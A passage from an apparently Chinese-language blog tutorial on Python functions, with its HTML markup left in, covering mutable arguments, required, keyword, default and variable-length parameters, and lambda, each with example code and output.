&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
change&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
140721657271968-
140721657271968
140721657272256
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;可变类型&#34;&gt;&lt;a href=&#34;#可变类型&#34; class=&#34;headerlink&#34; title=&#34;可变类型&#34;&gt;&lt;/a&gt;可变类型&lt;/h4&gt;&lt;p&gt;list，dictionary，set&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;列表赋值，然后再修改元素，列表地址不会改变，还是原来那个列表&lt;/li&gt;
&lt;li&gt;传入函数的这类参数，在函数内修改会影响到函数外的值&lt;/li&gt;
&lt;/ol&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;# 可写函数说明&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;changeme&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;mylist&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#34;&#34;&#34;修改传入的列表&#34;&#34;&#34;&lt;/span&gt;
    mylist&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;append&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;函数内取值: &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; mylist&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt;


&lt;span class=&#34;token comment&#34;&gt;# 调用changeme函数&lt;/span&gt;
mylist &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;20&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;30&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
changeme&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;mylist&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;函数外取值: &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; mylist&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
函数内取值:  [10, 20, 30, [1, 2, 3, 4]]
函数外取值:  [10, 20, 30, [1, 2, 3, 4]]
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;参数&#34;&gt;&lt;a href=&#34;#参数&#34; class=&#34;headerlink&#34; title=&#34;参数&#34;&gt;&lt;/a&gt;参数&lt;/h3&gt;&lt;h4 id=&#34;必需参数&#34;&gt;&lt;a href=&#34;#必需参数&#34; class=&#34;headerlink&#34; title=&#34;必需参数&#34;&gt;&lt;/a&gt;必需参数&lt;/h4&gt;&lt;p&gt;必需参数须以正确的顺序传入函数。调用时的数量必须和声明时的一样&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;#可写函数说明&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;printme&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
   &lt;span class=&#34;token string&#34;&gt;&#34;打印任何传入的字符串&#34;&lt;/span&gt;
   &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
   &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt;
 
&lt;span class=&#34;token comment&#34;&gt;# 调用 printme 函数，不加参数会报错&lt;/span&gt;
&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;
printme&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;关键字参数&#34;&gt;&lt;a href=&#34;#关键字参数&#34; class=&#34;headerlink&#34; title=&#34;关键字参数&#34;&gt;&lt;/a&gt;关键字参数&lt;/h4&gt;&lt;p&gt;关键字参数和函数调用关系紧密，函数调用使用关键字参数来确定传入的参数值，使用关键字参数允许函数调用时参数的顺序与声明时不一致，因为 Python 解释器能够用参数名匹配参数值。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;#可写函数说明&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;printinfo&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; name&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; age &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
   &lt;span class=&#34;token string&#34;&gt;&#34;打印任何传入的字符串&#34;&lt;/span&gt;
   &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;名字: &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; name&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
   &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;年龄: &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; age&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
   &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt;
 
&lt;span class=&#34;token comment&#34;&gt;#调用printinfo函数&lt;/span&gt;
printinfo&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; age&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;50&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; name&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;runoob&#34;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;默认参数&#34;&gt;&lt;a href=&#34;#默认参数&#34; class=&#34;headerlink&#34; title=&#34;默认参数&#34;&gt;&lt;/a&gt;默认参数&lt;/h4&gt;&lt;p&gt;调用函数时，如果没有传递参数，则会使用默认参数。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;#可写函数说明&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;printinfo&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; name&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; age &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;35&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
   &lt;span class=&#34;token string&#34;&gt;&#34;打印任何传入的字符串&#34;&lt;/span&gt;
   &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;名字: &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; name&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
   &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;年龄: &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; age&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
   &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt;
 
&lt;span class=&#34;token comment&#34;&gt;#调用printinfo函数&lt;/span&gt;
printinfo&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; age&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;50&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; name&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;runoob&#34;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;------------------------&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
printinfo&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; name&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;runoob&#34;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
名字:  runoob
年龄:  50
------------------------
名字:  runoob
年龄:  35
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;不定长参数&#34;&gt;&lt;a href=&#34;#不定长参数&#34; class=&#34;headerlink&#34; title=&#34;不定长参数&#34;&gt;&lt;/a&gt;不定长参数&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;functionname&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;formal_args&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;var_args_tuple &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
   &lt;span class=&#34;token string&#34;&gt;&#34;函数_文档字符串&#34;&lt;/span&gt;
   function_suite
   &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;expression&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;functionname&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;formal_args&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;**&lt;/span&gt;var_args_dict &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
   &lt;span class=&#34;token string&#34;&gt;&#34;函数_文档字符串&#34;&lt;/span&gt;
   function_suite
   &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;expression&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;ol&gt;
&lt;li&gt;加了星号 ***** 的参数会以元组(tuple)的形式导入，存放所有未命名的变量参数&lt;/li&gt;
&lt;li&gt;在函数调用时没有指定参数，它就是一个空元组&lt;/li&gt;
&lt;li&gt;加了两个星号 *&lt;strong&gt;*&lt;/strong&gt; 的参数会以字典的形式导入&lt;/li&gt;
&lt;li&gt;如果单独出现星号 ***** 后的参数必须用关键字传入&lt;/li&gt;
&lt;/ol&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;# 可写函数说明&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;printinfo&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; arg1&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;vartuple &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
   &lt;span class=&#34;token string&#34;&gt;&#34;打印任何传入的参数&#34;&lt;/span&gt;
   &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;输出: &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
   &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;arg1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
   &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; var &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; vartuple&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
      &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;var&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
   &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt;
 
&lt;span class=&#34;token comment&#34;&gt;# 调用printinfo 函数&lt;/span&gt;
printinfo&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
printinfo&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;70&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;60&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;50&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
输出: 
10
输出: 
70
60
50
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;# 可写函数说明&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;printinfo&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; arg1&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;**&lt;/span&gt;vardict &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
   &lt;span class=&#34;token string&#34;&gt;&#34;打印任何传入的参数&#34;&lt;/span&gt;
   &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;输出: &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
   &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;arg1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
   &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;vardict&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
 
&lt;span class=&#34;token comment&#34;&gt;# 调用printinfo 函数&lt;/span&gt;
printinfo&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; a&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;b&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
输出: 
1
{&#39;a&#39;: 2, &#39;b&#39;: 3}
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;匿名函数&#34;&gt;&lt;a href=&#34;#匿名函数&#34; class=&#34;headerlink&#34; title=&#34;匿名函数&#34;&gt;&lt;/a&gt;匿名函数&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;使用 lambda 来创建匿名函数&lt;/li&gt;
&lt;li&gt;lambda的主体是一个表达式，而不是一个代码块&lt;/li&gt;
&lt;li&gt;lambda 函数拥有自己的命名空间，且不能访问自己参数列表之外或全局命名空间里的参数&lt;/li&gt;
&lt;/ol&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;lambda&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;arg1 &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;arg2&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;argn&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;expression&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;# 可写函数说明&lt;/span&gt;
&lt;span class=&#34;token builtin&#34;&gt;sum&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;lambda&lt;/span&gt; arg1&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; arg2&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; arg1 &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; arg2
 
&lt;span class=&#34;token comment&#34;&gt;# 调用sum函数&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;相加后的值为 : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;sum&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
